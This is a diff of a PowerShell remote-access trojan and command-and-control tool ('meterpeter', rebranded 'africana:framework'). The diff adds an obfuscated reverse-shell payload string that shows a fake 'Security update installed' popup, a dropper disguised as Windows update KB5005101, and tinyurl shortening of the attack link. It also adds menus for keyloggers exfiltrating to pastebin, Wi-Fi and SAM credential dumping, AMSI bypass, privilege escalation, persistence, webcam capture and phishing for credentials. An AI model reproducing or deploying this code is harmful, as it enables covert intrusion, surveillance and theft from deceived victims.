@@ -17,6 +17,56 @@ $Dropper_Name = "Update-KB5005101"  # Payload-dropp`er filename (optional)
 $Acdst = "rem#ote ac#ce#ss" -replace '#',''
 $Acdts = "ob#fus#cat#ed" -replace '#',''
 
+$EndBanner = @"
+
+  __  __  ____  _____  ____  ____  ____  ____  _____  ____  ____ 
+ |  \/  || ===||_   _|| ===|| () )| ()_)| ===||_   _|| ===|| () )
+ |_|\/|_||____|  |_|  |____||_|\_\|_|   |____|  |_|  |____||_|\_\
+ Author: @ZHacker13 &('r00t-3xp10it') - SSA_redteam @2023 V${CmdLetVersion}
+ Date: $SserverTime - Cmdlet subdevelop version: $DeveloVersion
+"@;
+
+$StartBanner = @"
+
+  __  __  ____  _____  ____  ____  ____  ____  _____  ____  ____ 
+ |  \/  || ===||_   _|| ===|| () )| ()_)| ===||_   _|| ===|| () )
+ |_|\/|_||____|  |_|  |____||_|\_\|_|   |____|  |_|  |____||_|\_\
+ Author: @ZHacker13 &('r00t-3xp10it') - SSA_redteam @2023 V${CmdLetVersion}
+
+ Meterpeter its a command & control (C2) $Acdst tool (rat)
+ written in pure powershell released to windows (python3 required)
+ or to linux (powershell and apache2 required) distros. It creates
+ reverse_tcp_shell payloads (pure powershell + sockets) $Acdts
+ in BXOR using a secret key and also creates one dropper file that
+ allow users to fast deliver the payload on LAN networks for tests.
+"@;
+
+$Modules = @"
+
+  __  __  ____  _____  ____  ____  ____  ____  _____  ____  ____ 
+ |  \/  || ===||_   _|| ===|| () )| ()_)| ===||_   _|| ===|| () )
+ |_|\/|_||____|  |_|  |____||_|\_\|_|   |____|  |_|  |____||_|\_\
+ Author: @ZHacker13 &('r00t-3xp10it') - SSA_redteam @2023 V${CmdLetVersion}
+
+
+  Command      Description
+  -------      ------------------------------
+  Info         Remote host system information
+  Session      Meterpeter C2 connection status
+  AdvInfo      Advanced system information sub-menu
+  Upload       Upload from local host to remote host
+  Download     Download from remote host to local host
+  Screenshot   Capture remote host desktop screenshots
+  keylogger    Install remote host keyloggers sub-menu
+  PostExploit  Post Exploitation modules sub-menu
+  NetScanner   Local LAN network scanner sub-menu
+  Pranks       Prank remote host modules sub-menu
+  exit         Exit rev_tcp_shell [server+client]
+
+
+"@;
+
+
 try{#Check http.server
    $MyServer = python -V
    If(-not($MyServer) -or $MyServer -eq $null)
@@ -101,7 +151,7 @@ function NetworkStats($IP,$Port,$Base64_Key){
 
   [int]$Signature = Get-Random -Minimum 1 -Maximum 3
   $dadoninho = "Fr`omB" + "ase`6" + "4Str`ing" -Join ''
-  $deskmondll = "`$mscorelib='1'+'024' -Join '';`$MicrosoftAccountCloudAP='Cre'+'ateIn'+'stance' -join ''; `$3=`"#`";`$1=[System.Byte[]]::`$MicrosoftAccountCloudAP([System.Byte],`$mscorelib);Get-Date|Out-File bios.log;`$filemgmtdll='FromB'+'ase6'+'4String' -Join '';`$2=([Convert]::`$filemgmtdll(`"@`"));`$4=I``E``X([System.Runtime.Int"+"eropServices.Marshal]::PtrToStr"+"ingAuto([System.Runtime.InteropSe"+"rvices.Marshal]::SecureStringToBSTR((`$3|ConvertTo-SecureString -Key `$2))));While(`$5=`$4.GetStream()){;While(`$5.DataAvailable -or `$6 -eq `$1.count){;`$6=`$5.Read(`$1,0,`$1.length);`$7+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$1,0,`$6)};If(`$7){;`$8=(I``E``X(`$7)2>&1|Out-String);If(!(`$8.length%`$1.count)){;`$8+=`" `"};`$9=([text.encoding]::ASCII).GetBytes(`$8);`$5.Write(`$9,0,`$9.length);`$5.Flush();`$7=`$Null}}";
+  $deskmondll = "`$mscorelib='1'+'024' -Join '';`$MicrosoftAccountCloudAP='Cre'+'ateIn'+'stance' -join '';powershell (New-Object -ComObject Wscript.Shell).Popup('Security update installed.',$Signature,'KB5005101 21H1',0+0);`$3=`"#`";`$1=[System.Byte[]]::`$MicrosoftAccountCloudAP([System.Byte],`$mscorelib);Get-Date|Out-File bios.log;`$filemgmtdll='FromB'+'ase6'+'4String' -Join '';`$2=([Convert]::`$filemgmtdll(`"@`"));`$4=I``E``X([System.Runtime.Int"+"eropServices.Marshal]::PtrToStr"+"ingAuto([System.Runtime.InteropSe"+"rvices.Marshal]::SecureStringToBSTR((`$3|ConvertTo-SecureString -Key `$2))));While(`$5=`$4.GetStream()){;While(`$5.DataAvailable -or `$6 -eq `$1.count){;`$6=`$5.Read(`$1,0,`$1.length);`$7+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$1,0,`$6)};If(`$7){;`$8=(I``E``X(`$7)2>&1|Out-String);If(!(`$8.length%`$1.count)){;`$8+=`" `"};`$9=([text.encoding]::ASCII).GetBytes(`$8);`$5.Write(`$9,0,`$9.length);`$5.Flush();`$7=`$Null}}";
 
   $Key = $([System.Convert]::$dadoninho($Base64_Key))
   #$NewKey = (3,4,2,3,56,34,254,222,1,1,2,23,42,54,33,233,1,34,2,7,6,5,35,43)
@@ -173,7 +223,7 @@ $LPORT = Read-Host;
 $Local_Port = $LPORT -replace " ","";
 
 ## Default settings
-If(-not($Local_Port)){$Local_Port = "777"};
+If(-not($Local_Port)){$Local_Port = "666"};
 If(-not($Local_Host)){
    If($DISTRO_OS){
       ## Linux Flavor
@@ -284,7 +334,7 @@ If($check -ieq $False)
     # Deliver Dro`pper.zip using python http.server
     write-Host "   WebServer    Client                Dropper               WebRoot" -ForegroundColor Green;
     write-Host "   ---------    ------                -------               -------";
-    write-Host "   Python3      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n";
+    write-Host "   Python3      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n`n";
     Copy-Item -Path $IPATH$payload_name.ps1 -Destination $APACHE$payload_name.ps1 -Force
 
     If($FlavorSellection -eq 2)
@@ -603,7 +653,7 @@ else
   # Deliver Dro`pper.zip using Apache2 webserver
   write-Host "   WebServer    Client                Dropper               WebRoot" -ForegroundColor Green;
   write-Host "   ---------    ------                -------               -------";
-  write-Host "   Apache2      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n";
+  write-Host "   Apache2      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n`n";
   Copy-Item -Path $IPATH$payload_name.ps1 -Destination $APACHE$payload_name.ps1 -Force;
 
   If($FlavorSellection -eq 2)
@@ -699,16 +749,16 @@ else
   Copy-Item -Path "${IPATH}\mimiRatz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
   ((Get-Content -Path "${APACHE}Update-KB5005101.html" -Raw) -Replace "henrythenavigator","$Dropper_Name")|Set-Content -Path "${APACHE}Update-KB5005101.html"
 
-  Write-Host "[i] Attack Vector: http://$Local_Host/$Dropper_Name.html" -ForeGroundColor Green;
+  Write-Host "[i] Attack Vector: http://$Local_Host/$Dropper_Name.html" -ForeGroundColor Black -BackGroundColor white;
 
   #Shorten Url function
-  #$Url = "http://$Local_Host/$Dropper_Name.html"
-  #$tinyUrlApi = 'http://tinyurl.com/api-create.php'
-  #$response = Invoke-WebRequest ("{0}?url={1}" -f $tinyUrlApi, $Url)
-  #$response.Content|Out-File -FilePath "$Env:TMP\sHORTENmE.meterpeter" -Force
-  #$GetShortenUrl = Get-Content -Path "$Env:TMP\sHORTENmE.meterpeter"
-  #Write-Host "[i] Shorten Uri  : $GetShortenUrl" -ForeGroundColor Black -BackGroundColor white
-  #Remove-Item -Path "$Env:TMP\sHORTENmE.meterpeter" -Force
+  $Url = "http://$Local_Host/$Dropper_Name.html"
+  $tinyUrlApi = 'http://tinyurl.com/api-create.php'
+  $response = Invoke-WebRequest ("{0}?url={1}" -f $tinyUrlApi, $Url)
+  $response.Content|Out-File -FilePath "$Env:TMP\sHORTENmE.meterpeter" -Force
+  $GetShortenUrl = Get-Content -Path "$Env:TMP\sHORTENmE.meterpeter"
+  Write-Host "[i] Shorten Uri  : $GetShortenUrl" -ForeGroundColor Black -BackGroundColor white
+  Remove-Item -Path "$Env:TMP\sHORTENmE.meterpeter" -Force
 
 }
 $check = $Null;
@@ -838,7 +888,7 @@ While($Client.Connected)
       Write-Host "[ NetScanner   Local LAN network scanner sub-menu         ]     " -ForegroundColor Blue
       Write-Host "[ Pranks       Prank remote host modules sub-menu         ]     " -ForegroundColor Blue
       Write-Host "[ exit         Exit rev_tcp_shell [server+client]         ]     " -ForegroundColor Blue
-      Write-Host "`n(africana:framework)# " -NoNewline -ForeGroundColor Green;
+      Write-Host "`n(africana:framework): " -NoNewline -ForeGroundColor Green;
       $Command = Read-Host;
     }
 
@@ -932,7 +982,7 @@ While($Client.Connected)
       write-host "   Nodrives       Hide All Drives (C:D:E:F:G) From Explorer";
       write-host "   LabelDrive     Rename drive letter (C:) label From Explorer";
       write-host "   Return         Return to Server Main Menu" -ForeGroundColor yellow
-      write-host "`n`n(africana:framework)#Pranks> " -NoNewline -ForeGroundColor Green;
+      write-host "`n`n(africana:framework):Pranks> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
       If($choise -ieq "BallonTip")
       {
@@ -944,7 +994,7 @@ While($Client.Connected)
          write-host "   -------  -----------                    -------------------"
          write-host "   Spawn    ballontip in notification bar  UserLand"
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Pranks:BallonTip> " -NoNewline -ForeGroundColor Green
+         write-host "`n`n(africana:framework):Pranks:BallonTip> " -NoNewline -ForeGroundColor Green
          $Prank_choise = Read-Host;
          If($Prank_choise -ieq "Spawn")
          {
@@ -956,13 +1006,13 @@ While($Client.Connected)
                write-host "   => Error: wrong input, default to: '$Title'" -ForegroundColor Red
             }
 
-            write-host " - BallonTip Text      : " -NoNewline
-            $Text = Read-Host
-            If([string]::IsNullOrEmpty($Text))
-            {
-               $Text = "A virus has detected in `$Env:COMPUTERNAME"
-               write-host "   => Error: wrong input, default to: '$Text'" -ForegroundColor Red
-            }
+            #write-host " - BallonTip Text      : " -NoNewline
+            #$Text = Read-Host
+            #If([string]::IsNullOrEmpty($Text))
+            #{
+            #   $Text = "A vir`us has detected in `$Env:COMPUTERNAME" ###### africana
+            #   write-host "   => Error: wrong input, default to: '$Text'" -ForegroundColor Red
+            #}
 
             write-host " - BallonTip IconType  : " -NoNewline
             $IconType = Read-Host
@@ -1000,7 +1050,7 @@ While($Client.Connected)
          write-host "   -------  -----------                  -------------------";
          write-host "   Start    execute prank in background  UserLand";
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Pranks:WU> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Pranks:WU> " -NoNewline -ForeGroundColor Green;
          $Prank_choise = Read-Host;
          If($Prank_choise -ieq "Start")
          {
@@ -1024,7 +1074,7 @@ While($Client.Connected)
         write-host "   Rename    Rename drive letter label       " -NoNewline;
         write-host "Administrator" -ForegroundColor Red;
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Pranks:Label> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Pranks:Label> " -NoNewline -ForeGroundColor Green;
         $choise_two = Read-Host;
         If($choise_two -ieq "List")
         {
@@ -1060,7 +1110,7 @@ While($Client.Connected)
         write-host "   Enable    Show Drives in Explorer         "  -NoNewline;
         write-host "Administrator" -ForegroundColor Red;
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Pranks:NoDrives> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Pranks:NoDrives> " -NoNewline -ForeGroundColor Green;
         $choise_two = Read-Host;
         If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
         {
@@ -1111,7 +1161,7 @@ While($Client.Connected)
          write-host "   simple   Spawn simple msgbox          UserLand";
          write-host "   cmdline  msgbox that exec cmdline     UserLand";
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Pranks:Msgbox> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Pranks:Msgbox> " -NoNewline -ForeGroundColor Green;
          $msgbox_choise = Read-Host;
          If($msgbox_choise -ieq "Simple")
          {
@@ -1188,7 +1238,7 @@ While($Client.Connected)
         write-host "   -------   -----------                     -------------------"
         write-host "   start     speak input sentence            UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Pranks:Speak> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Pranks:Speak> " -NoNewline -ForeGroundColor Green;
         $Speak_choise = Read-Host;
         If($Speak_choise -ieq "start")
         {
@@ -1225,7 +1275,7 @@ While($Client.Connected)
          write-host "   -------  -----------                  -------------------"
          write-host "   Open     Url on default browser       UserLand";
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Pranks:Url> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Pranks:Url> " -NoNewline -ForeGroundColor Green;
          $url_choise = Read-Host;
          If($url_choise -ieq "Open")
          {
@@ -1268,7 +1318,7 @@ While($Client.Connected)
         write-host "   googlespace Open google-space               UserLand";
         write-host "   kidscoding  Open Google-kidscoding          UserLand";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Pranks:GoogleX> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Pranks:GoogleX> " -NoNewline -ForeGroundColor Green;
         $EasterEgg = Read-Host;
         If($EasterEgg -ieq "terminal")
         {
@@ -1397,7 +1447,7 @@ While($Client.Connected)
       write-host "   PingScan    List devices ip addr\ports\dnsnames on Lan";
       write-host "   GeoLocate   List Client GeoLocation curl \ ifconfig.me";
       write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow
-      write-host "`n`n(africana:framework)#Net> " -NoNewline -ForeGroundColor Green;
+      write-host "`n`n(africana:framework):Net> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
       If($choise -ieq "ListDNS" -or $choise -ieq "dns")
       {
@@ -1415,7 +1465,7 @@ While($Client.Connected)
          write-host "   Query    Established TCP connections    UserLand";
          write-host "   Verbose  Query TCP\UDP\DNS\ARP cache    UserLand";
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Net:Tcp> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Net:Tcp> " -NoNewline -ForeGroundColor Green;
          $ConManager_choise = Read-Host;
          If($ConManager_choise -ieq "Stats")
          {
@@ -1450,7 +1500,7 @@ While($Client.Connected)
         write-host "   ListSSID  List Remote-Host SSID Entrys    UserLand";
         write-host "   SSIDPass  Extract Stored SSID passwords   UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Net:Wifi> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Net:Wifi> " -NoNewline -ForeGroundColor Green;
         $wifi_choise = Read-Host;
         If($wifi_choise -ieq "ListProf" -or $wifi_choise -ieq "prof")
         {
@@ -1503,7 +1553,7 @@ While($Client.Connected)
          write-host "   Enum      List active ip addresses on local Lan  UserLand";
          write-host "   PortScan  Single ip port scanner \ dns resolver  UserLand";
          write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n(africana:framework)#Net:Ping> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Net:Ping> " -NoNewline -ForeGroundColor Green;
          $ping_choise = Read-Host;
          If($ping_choise -ieq "Enum")
          {
@@ -1564,7 +1614,7 @@ While($Client.Connected)
          write-host "   GeoLocate Client GeoLocation using curl   UserLand";
          write-host "   ifconfig  Client GeoLocation using ipinfo UserLand";
          write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n(africana:framework)#Net:Geo> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Net:Geo> " -NoNewline -ForeGroundColor Green;
          $Geo_choise = Read-Host;
          If($Geo_choise -ieq "GeoLocate")
          {
@@ -1645,7 +1695,7 @@ While($Client.Connected)
       write-host "   FRManager   Manage remote 'active' firewall rules";
       write-host "   OutLook     Manage OutLook Exchange Email Objects";
       write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-      write-host "`n`n(africana:framework)#Adv> " -NoNewline -ForeGroundColor Green;
+      write-host "`n`n(africana:framework):Adv> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
       ## Runing sellected Module(s).
       If($choise -ieq "OutLook")
@@ -1661,7 +1711,7 @@ While($Client.Connected)
          write-host "   Emails    Display outlook email objects   UserLand";
          write-host "   SendMail  Send Email using target domain  UserLand";
          write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n(africana:framework)#Adv:OutLook> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Adv:OutLook> " -NoNewline -ForeGroundColor Green;
          $OutLook_choise = Read-Host;
          If($OutLook_choise -ieq "Folders")
          {
@@ -1797,7 +1847,7 @@ While($Client.Connected)
          write-host "   Kill       Kill Remote Process From Running   " -NoNewline
          write-host "Administrator" -ForegroundColor Red;
          write-host "   Return     Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n(africana:framework)#Adv:Proc> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Adv:Proc> " -NoNewline -ForeGroundColor Green;
          $wifi_choise = Read-Host;
          If($wifi_choise -ieq "Query")
          {
@@ -1885,7 +1935,7 @@ While($Client.Connected)
          write-host "   LoopExec  Create a new remote task        UserLand";
          write-host "   Delete    Delete Remote-Host Single Task  UserLand";
          write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n(africana:framework)#Adv:Tasks> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Adv:Tasks> " -NoNewline -ForeGroundColor Green;
          $my_choise = Read-Host;
          If($my_choise -ieq "Check")
          {
@@ -2010,7 +2060,7 @@ While($Client.Connected)
          write-host "   Verbose     Enumerating browsers (slow)     UserLand";
          write-host "   Clean       Major browsers temporary files  UserLand";
          write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n(africana:framework)#Adv:Browser> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Adv:Browser> " -NoNewline -ForeGroundColor Green;
          $Enumerate_choise = Read-Host;
          If($Enumerate_choise -ieq "Start")
          {
@@ -2086,7 +2136,7 @@ While($Client.Connected)
          write-host "   FastScan  Security processes + EDR hunt  UserLand";
          write-host "   Verbose   Full scan module (accurate)    UserLand";
          write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n(africana:framework)#Adv:Avp> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Adv:Avp> " -NoNewline -ForeGroundColor Green;
          $my_choise = Read-Host;
          If($my_choise -ieq "Primary")
          {
@@ -2139,7 +2189,7 @@ While($Client.Connected)
          write-host "   Delete    Delete sellected firewall rule  " -NoNewline
          write-host "Administrator" -ForegroundColor Red;
          write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n(africana:framework)#Adv:Frm> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Adv:Frm> " -NoNewline -ForeGroundColor Green;
          $Firewall_choise = Read-Host;
          If($Firewall_choise -ieq "Query")
          {
@@ -2239,7 +2289,7 @@ While($Client.Connected)
        write-host "   Browser      Capture browser(s) tab title        Start\Stop\Leak windows tab title"
        write-host "   SocialMedia  Capture keystrokes from FB\Twitter  Start\Stop FB,Twitter keylogger"
        write-host "   Return       Return to Server Main Menu" -ForeGroundColor yellow;
-       write-host "`n`n(africana:framework)#keyl`ogger> " -NoNewline -ForeGroundColor Green;
+       write-host "`n`n(africana:framework):keyl`ogger> " -NoNewline -ForeGroundColor Green;
        $choise = Read-Host;
        If($choise -ieq "Browser")
        {
@@ -2535,7 +2585,7 @@ While($Client.Connected)
           write-host "   -------   -----------                  ------";
           write-host "   Start     Send keys`trokes to pastebin  max of 20 pastes allowed by day";
           write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-          write-host "`n`n(africana:framework)#keyl`ogger:PasteBin> " -NoNewline -ForeGroundColor Green;
+          write-host "`n`n(africana:framework):keyl`ogger:PasteBin> " -NoNewline -ForeGroundColor Green;
           $PasteBinChoise = Read-Host;
           If($PasteBinChoise -ieq "Start")
           {
@@ -2648,7 +2698,7 @@ While($Client.Connected)
       write-host "   LockPC      Lock remote host WorkStation";
       write-host "   Restart     Restart remote host WorkStation";
       write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-      write-host "`n`n(africana:framework)#Post> " -NoNewline -ForeGroundColor Green;
+      write-host "`n`n(africana:framework):Post> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
       If($choise -ieq "Msstore")
       {
@@ -2662,7 +2712,7 @@ While($Client.Connected)
          write-host "   install   application from msstore   UserLand";
          write-host "   Uninstall application from [local]   UserLand";
          write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Post:Msstore> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Post:Msstore> " -NoNewline -ForeGroundColor Green;
          $win_choise = Read-Host;
          If($win_choise -ieq "List")
          {
@@ -2748,7 +2798,7 @@ While($Client.Connected)
          write-host "   Create   Create\Modify super hidden   UserLand";
          write-host "   Delete   One super hidden folder      UserLand";
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Post:Hidden> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Post:Hidden> " -NoNewline -ForeGroundColor Green;
          $Vault_choise = Read-Host;
          If($Vault_choise -ieq "Search")
          {
@@ -2892,7 +2942,7 @@ While($Client.Connected)
         write-host "   Delete      Delete one Defender exclusion    " -NoNewline
         write-host "Administrator" -ForegroundColor Red;
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Post:Exclusions> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Post:Exclusions> " -NoNewline -ForeGroundColor Green;
         $WD_choise = Read-Host;
         If($WD_choise -ieq "Query")
         {
@@ -2991,7 +3041,7 @@ While($Client.Connected)
         write-host "   cmdline     Execute 1 cmdline with full privileges  " -NoNewline
         write-host "Administrator" -ForegroundColor Red;
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Post:Allprivs> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Post:Allprivs> " -NoNewline -ForeGroundColor Green;
         $all_choise = Read-Host;
         If($all_choise -ieq "demo")
         {
@@ -3033,7 +3083,7 @@ While($Client.Connected)
         write-host "   FilePath    Execute input script trough bypa`ss     UserLand";
         write-host "   PayloadUrl  Download\Execute script trough bypa`ss  UserLand";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Post:AMS`IPatch> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Post:AMS`IPatch> " -NoNewline -ForeGroundColor Green;
         $Patch_choise = Read-Host;
         If($Patch_choise -ieq "Console")
         {
@@ -3107,7 +3157,7 @@ While($Client.Connected)
         write-host "   RottenP   Search For rotten potato vuln     UserLand";
         write-host "   Agressive Search all EOP possible entrys    UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Post:Eop> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Post:Eop> " -NoNewline -ForeGroundColor Green;
         $my_choise = Read-Host;
         If($my_choise -ieq "Agressive")
         {
@@ -3177,7 +3227,7 @@ While($Client.Connected)
          write-host "   Delete   Delete hidden account        " -NoNewline
          write-host "Administrator" -ForegroundColor Red;
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Post:HideUser> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Post:HideUser> " -NoNewline -ForeGroundColor Green;
          $AccManager_choise = Read-Host;
          If($AccManager_choise -ieq "Query")
          {
@@ -3219,7 +3269,7 @@ While($Client.Connected)
          write-host "   check    existing file timestamp      UserLand";
          write-host "   Modify   existing file timestamp      UserLand";
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Post:Mace> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Post:Mace> " -NoNewline -ForeGroundColor Green;
          $timestamp_choise = Read-Host;
          If($timestamp_choise -ieq "check")
          {
@@ -3271,7 +3321,7 @@ While($Client.Connected)
          write-host "   Paranoid clean tracks paranoid        UserLand\" -NoNewline
          write-host "Administrator" -ForegroundColor Red;
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Post:Artifacts> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Post:Artifacts> " -NoNewline -ForeGroundColor Green;
          $track_choise = Read-Host;
          If($track_choise -ieq "Query")
          {
@@ -3311,7 +3361,7 @@ While($Client.Connected)
          write-host "   -------  -----------                  ------------------";
          write-host "   Start    Stream target desktop        UserLand";
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Post:Stream> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Post:Stream> " -NoNewline -ForeGroundColor Green;
          $Stream_choise = Read-Host;
          If($Stream_choise -ieq "Start")
          {
@@ -3389,8 +3439,8 @@ While($Client.Connected)
           __                 _____ _____     _     _
        __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_
       |  |  | -_|_ -| | |_ -|   --|     |  _| |_ -|  _|
-      |_____|___|___|___|___|_____|__|__|_| |_|___|_|
-Stream_Desktop_Live ..
+      |_____|___|___|___|___|_____|__|__|_| |_|___|_| Stream_Desktop_Live ..
+---------------------------------------------------------------------
 "@;Write-Host $AnwsomeBanner
                Write-Host "* Start firefox on: '" -ForegroundColor Red -BackgroundColor Black -NoNewline;
                Write-host "http://${RemoteHost}:${BindPort}" -ForegroundColor Green -BackgroundColor Black -NoNewline;
@@ -3421,7 +3471,7 @@ Stream_Desktop_Live ..
         write-host "   UACpriv     use runa[s] to spawn UAC diag UserLand"
         write-host "   CmdLine     Uac execute command elevated  UserLand"
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow
-        write-host "`n`n(africana:framework)#Post:Escalate> " -NoNewline -ForeGroundColor Green
+        write-host "`n`n(africana:framework):Post:Escalate> " -NoNewline -ForeGroundColor Green
         $Escal_choise = Read-Host;
         If($Escal_choise -ieq "UACpriv")
         {
@@ -3508,8 +3558,8 @@ Stream_Desktop_Live ..
                       ~ `-i' ::>|--"
                           I;|.|.|
                          <|i::|i|`.
-                        (` ^'"`-' ") CMSTP EOP
---------------------------------------------------------------------------
+                        (` ^'"`-' ") Jesus is Love.
+----------------------------------------------------------
 "@;Write-Host $AnwsomeBanner
           Write-Host "* Exit *Meterpeter* and start a new Handler to recive the elevated shell.." -ForegroundColor Red -BackgroundColor Black
           Write-Host "  => _EOP_ shell settings: lhost:" -ForegroundColor Red -BackgroundColor Black -NoNewline;
@@ -3563,7 +3613,7 @@ Stream_Desktop_Live ..
         write-host "   WinLogon  Persiste Client using WinLogon  " -NoNewline
         write-host "Administrator" -ForegroundColor Red
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Post:Persistance> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Post:Persistance> " -NoNewline -ForeGroundColor Green;
         $startup_choise = Read-Host;
         If($startup_choise -ieq "Beacon")
         {
@@ -3766,7 +3816,7 @@ Stream_Desktop_Live ..
         write-host "   WebCamAvi  Webcam live stream [.avi]   " -NoNewline
         write-host "Administrator" -ForegroundColor Red
         write-host "   Return     Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Post:Cam> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Post:Cam> " -NoNewline -ForeGroundColor Green;
         $Cam_choise = Read-Host;
         If($Cam_choise -ieq "Device")
         {
@@ -3962,7 +4012,7 @@ Stream_Desktop_Live ..
         write-host "   DumpSAM   Dump hashs from registry hives " -NoNewline
         write-host "Administrator" -ForegroundColor Red
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Post:Pass> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Post:Pass> " -NoNewline -ForeGroundColor Green;
         $pass_choise = Read-Host;
         If($pass_choise -ieq "Putty")
         {
@@ -4081,7 +4131,7 @@ Stream_Desktop_Live ..
         write-host "   -------   -----------                     ------------------";
         write-host "   start     lock target pc                  UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Post:Lock> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Post:Lock> " -NoNewline -ForeGroundColor Green;
         $Lock_choise = Read-Host;
         If($Lock_choise -ieq "start")
         {
@@ -4105,7 +4155,7 @@ Stream_Desktop_Live ..
         write-host "   -------     -----------                 ------------------";
         write-host "   Start       Phish for remote creds      UserLand";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
